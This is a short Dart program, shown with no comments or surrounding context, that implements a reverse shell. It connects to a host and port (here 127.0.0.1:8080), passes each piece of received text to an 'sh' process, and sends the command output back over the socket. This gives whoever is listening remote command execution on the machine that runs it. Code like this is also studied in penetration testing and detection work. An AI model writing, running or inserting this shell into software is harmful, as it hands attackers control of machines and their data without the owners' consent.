import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("127.0.0.1", 8080).then((socket) {
    socket.listen((data) {
      Process.start('sh', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}